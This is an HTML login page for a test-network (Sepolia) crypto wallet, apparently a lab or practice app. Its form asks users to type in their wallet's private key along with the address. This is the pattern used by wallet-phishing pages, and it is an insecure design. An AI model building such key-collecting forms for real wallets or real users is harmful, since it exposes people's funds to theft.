<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #f4f4f9, #e0e7ff);
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #ffffff;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h1 {
            font-size: 1.8em;
            margin-bottom: 20px;
            color: #222;
        }
        p {
            font-size: 1em;
            margin-bottom: 20px;
            color: #555;
        }
        label {
            font-size: 1em;
            margin-bottom: 10px;
            display: block;
            text-align: left;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 20px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            transition: border-color 0.3s ease;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #0056d2;
            outline: none;
            box-shadow: 0 0 4px rgba(0, 86, 210, 0.3);
        }
        button {
            background: #0056d2;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            transition: background 0.3s ease, transform 0.2s ease;
        }
        button:hover {
            background: #003a9d;
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
        }
        form {
            margin-top: 20px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login to Your Wallet</h1>
        <p>Access your decentralized wallet securely and manage your Sepolia ETH tokens.</p>
        <form action="/login" method="post">
            <label for="login">Wallet Address</label>
            <input type="text" id="login" name="login" placeholder="Enter your wallet address" required>

            <label for="password">Private Key</label>
            <input type="password" id="password" name="password" placeholder="Enter your private key" required>

            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
